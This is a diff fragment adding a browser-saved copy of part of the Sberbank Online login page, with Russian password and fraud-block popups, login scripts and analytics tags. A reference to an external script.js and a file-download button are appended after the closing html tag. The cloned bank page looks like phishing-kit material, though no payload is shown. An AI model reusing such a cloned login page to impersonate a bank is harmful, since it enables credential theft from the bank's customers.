+                                <button type="submit" class="btn_hidden"></button>
+                            </div>
+                            <!-- // b-btn -->
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+        <!-- // b-popup -->
+
+        <div class="b-popup" id="CustomPopup">
+            <div class="popup_inner"></div>
+            <a class="popup_close" title="Закрыть"></a>
+        </div>
+        <!-- // b-popup -->
+
+        <div class="b-popup" id="IpasPasswordMessage">
+            <div class="popup_inner">
+                <div class="popup_content">
+                    <div class="password-message-title">
+                        Пароль изменен
+                    </div>
+                    <div class="password-message-text">
+                        Вам отправлено SMS-сообщение с новым паролем
+                    </div>
+                    <p style="padding-bottom: 0.15em">
+                    </p><div class="b-button">
+                        <div class="b-btn btn-yellow">
+                            <div class="btn_text_large">Войти в Сбербанк&nbsp;Онлайн</div>
+                            <a href="https://online.sberbank.ru/CSAFront/index.do"><button type="button" class="btn_hidden"></button></a>
+                        </div><!-- // b-btn -->
+                    </div>
+                    <br>
+                </div>
+            </div>
+            <a class="popup_close" title="Закрыть"></a>
+        </div>
+
+        <div class="b-popup" id="PasswordMessage">
+            <div class="popup_inner">
+                <div class="popup_content">
+                    <div class="password-message-title">
+                        Пароль изменен
+                    </div>
+                    <div class="password-message-text">
+                        Постарайтесь запомнить пароль от Сбербанка 
+Онлайн, а лучше запишите и сохраните в надежном, секретном месте и не 
+сообщайте никому
+                    </div>
+                    <p style="padding-bottom: 0.15em">
+                    </p><div class="b-button">
+                        <div class="b-btn btn-yellow">
+                            <div class="btn_text_large">Войти в Сбербанк&nbsp;Онлайн</div>
+                            <a href="https://online.sberbank.ru/CSAFront/index.do"><button type="button" class="btn_hidden"></button></a>
+                        </div><!-- // b-btn -->
+                    </div>
+                    <br>
+                </div>
+            </div>
+            <a class="popup_close" title="Закрыть"></a>
+        </div>
+
+        <div class="b-popup blocked-by-fraud" id="LoginBlockedByFraud">
+            <div class="popup_inner">
+                <div class="popup_content">
+                    <div class="blocked-by-fraud-title">
+                        Учетная&nbsp;запись&nbsp;заблокирована
+                    </div>
+                    <div class="blocked-by-fraud-text">
+                        Невозможно восстановить логин от вашей учетной 
+записи. Обратитесь за помощью в отделение или позвоните в Контактный 
+центр Сбербанка:
+                    </div>
+                    <div class="fraud-block-phones-box">
+                        <div class="phones-row" style="position: inherit;">
+                            <div class="mobile">
+                                <img src="%D0%A1%D0%B1%D0%B5%D1%80%D0%B1%D0%B0%D0%BD%D0%BA%20%D0%9E%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD_files/icon-phone-login.png" class="fraud-block-phone-img">
+                                <div class="phones_phone fraud-block-mobile-font">900</div>
+                                <div class="b-data data_descr fraud-block-mobile-descr">с&nbsp;мобильного</div>
+                            </div>
+                            <div class="regular">
+                                <div class="phones_phone" style="overflow: hidden; margin-top: 5px;"><span class="fraud-blocked-plus">+</span>7&nbsp;495 <b>500-555-0</b></div>
+                                <div class="phones_phone">8&nbsp;800 <b>555-555-0</b></div>
+                            </div>
+                        </div>
+                    </div>
+                    <p style="padding-bottom: 0.15em">
+                    </p><div class="b-button">
+                        <div class="b-btn btn-yellow">
+                            <div class="btn_text_large">Вернуться на главную</div>
+                            <a href="https://online.sberbank.ru/CSAFront/index.do"><button type="button" class="btn_hidden"></button></a>
+                        </div><!-- // b-btn -->
+                    </div>
+                    <br>
+                </div>
+            </div>
+            <a class="popup_close" title="Закрыть"></a>
+        </div>
+    </div>
+    <!-- // g-overlay -->
+
+</div>
+<!-- // g-wrapper -->
+
+
+
+
+<script type="text/javascript">
+    initCSA("CSAFront","https://stat.online.sberbank.ru/CSAFront-res/28.1");
+
+    var authForm;
+    
+    $(document).ready(function(){
+       authForm = new AuthForm(true);
+       authForm.showForm('login-form', true);
+       authForm.fsoPublish({'fso': {'detection' : true, 'token' : '', 'swfPath' : 'https://stat.online.sberbank.ru/CSAFront-res/28.1/images/swf/', 'sendUrl' : '/CSAFront/pmfso'}});
+    });
+
+    
+    function openCSAHelp()
+    {
+        var helpUrl = '/CSAFront/help.do?id=' + '%2Findex';
+        if (additionalHelpId != '')
+            helpUrl += '/' + additionalHelpId;
+        return openHelp(helpUrl);
+    }
+
+    function validateAndSubmitIfEnter(event)
+    {
+        event = event || window.event;
+        var code = navigator.appName == 'Netscape' ? event.which : event.keyCode;
+        // если не enter - пропускаем
+        if(code != 13)
+            return;
+
+        validateAndSubmit();
+    }
+
+    function validateAndSubmit()
+    {
+        var loginForm = $('#loginForm');
+        $.data(loginForm[0], 'jForm').submit();
+        loginForm.trigger('validateAndSubmitEvent');
+    }
+
+    function displayErrors(errors) {
+        if (displayErrorsWithCode(errors)) {
+            return;
+        }
+        var headerText = errors.indexOf('GuestEntryMode') < 0 ? "Во&nbsp;входе отказано" : "Сервис&nbsp;временно&nbsp;недоступен";
+        var html = "<h2 class='popup_title c-red'>" + headerText +"</h2><div class='popup_content'><p>" + errors + "</p></div>";
+        overlay.showPopup('AccessDenied', html);
+    }
+</script>
+
+
+        <script type="text/javascript">
+            function submitData()
+            {
+                authForm.hidePassword();
+                authForm.submit($('#buttonSubmit')[0], 'button.begin');
+            }
+
+            function setElementValue(name, value)
+            {
+                var frm = $("#loginForm")[0];
+                var field = getElementFromCollection(frm.elements, name);
+                if (field == null)
+                {
+                    addField('hidden', name, value);
+                }
+                else
+                {
+                    field.value = value;
+                }
+            }
+        </script>
+        
+    
+
+
+    
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+    
+    
+
+    
+
+    
+
+    
+        
+        
+            
+            
+
+
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-34621209-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+ 
+
+
+
+(function (d, w, c) {
+    (w[c] = w[c] || []).push(function() {
+        try {
+           w.yaCounter16949086 = new Ya.Metrika({id:16949086, enableAll: true});
+        } catch(e) { }
+    });
+
+    var n = d.getElementsByTagName("script")[0],
+        s = d.createElement("script"),
+        f = function () { n.parentNode.insertBefore(s, n); };
+    s.type = "text/javascript";
+    s.async = true;
+    s.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//mc.yandex.ru/metrika/watch.js";
+
+    if (w.opera == "[object Opera]") {
+        d.addEventListener("DOMContentLoaded", f);
+    } else { f(); }
+})(document, window, "yandex_metrika_callbacks");
+</script>
+<noscript><div><img src="//mc.yandex.ru/watch/16949086" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+
+
+
+
+
+
+
+<script type="text/javascript" id="">(function(d,a,b){(a[b]=a[b]||[]).push(function(){try{a.yaCounter31643078=new Ya.Metrika({id:31643078,clickmap:!0,trackLinks:!0,accurateTrackBounce:!0,trackHash:!0,ut:"noindex",params:window.yaParams}),a.yaCounter34972370=new Ya.Metrika({id:34972370,clickmap:!0,trackLinks:!0,accurateTrackBounce:!0,trackHash:!0,ut:"noindex",params:window.yaParams})}catch(f){}});var e=d.getElementsByTagName("script")[0],c=d.createElement("script");b=function(){e.parentNode.insertBefore(c,e)};c.type="text/javascript";
+c.async=!0;c.src="https://mc.yandex.ru/metrika/watch.js";"[object Opera]"==a.opera?d.addEventListener("DOMContentLoaded",b,!1):b()})(document,window,"yandex_metrika_callbacks");</script>
+<noscript>
+  <div>
+    <img src="https://mc.yandex.ru/watch/31590478?ut=noindex" style="position:absolute; left:-9999px;" alt="">
+  </div>
+</noscript>
+
+<script type="text/javascript" id="">(function(b,a,c,e,f,g){var d=a.getElementsByTagName(c)[0];a=a.createElement(c);a.async=!0;a.src="//cdn.rutarget.ru/static/tag/tag.js";d.parentNode.insertBefore(a,d);b[e]=!0;b[f]=!1;b[g]=!0})(window,document,"script","rtgNoSync","rtgSyncFrame","rtgCounter");var _rutarget=window._rutarget||[];_rutarget.push({event:"otherPage"});</script>
+<iframe style="visibility: hidden; position: absolute; left: -9999px;" width="0" height="0"></iframe></body></html>
+
+
+
+<script type="text/javascript" src="script.js">
+</script>
+<a href="" id="a">click here to download your file</a>
+<button onclick="download('file text', 'myfilename.txt', 'text/plain')">Create file</button>
